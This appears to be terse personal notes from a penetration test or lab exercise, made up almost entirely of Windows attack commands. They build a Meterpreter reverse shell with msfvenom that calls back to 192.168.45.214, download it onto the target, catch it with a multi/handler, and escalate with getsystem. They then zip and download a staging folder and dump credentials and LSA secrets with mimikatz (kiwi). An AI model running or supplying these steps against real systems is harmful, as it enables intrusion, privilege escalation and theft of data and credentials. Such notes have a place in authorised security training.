  powershell -ExecutionPolicy Bypass -File shell.ps1

  // build reverse shell
  sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f exe -o met443staged.exe
  // drop on box
  powershell -c "Invoke-WebRequest -Uri http://192.168.45.214/tools/met443staged.exe -OutFile met443staged.exe"
  // enter meterpreter
  sudo msfconsole
  use multi/handler
  set payload windows/x64/meterpreter_reverse_tcp
  show options
  set LHOST ...
  set LPORT ...
  // run printspoofer -i -c "cmd.exe" on target
  // fails
  // getsystem now works
  getsystem
  getuid

  cd c:/staging
  execute -f powershell -a "-c Compress-Archive 'C:\staging\*' -Destination-Path 'C:\staging.zip'" -i
  download -r .

  // load mimikatz
  load kiwi -> help
  //creds_all
  // sekurlsa::logonpasswords
  lsa_dump_secrets
```


send a mail to 189 
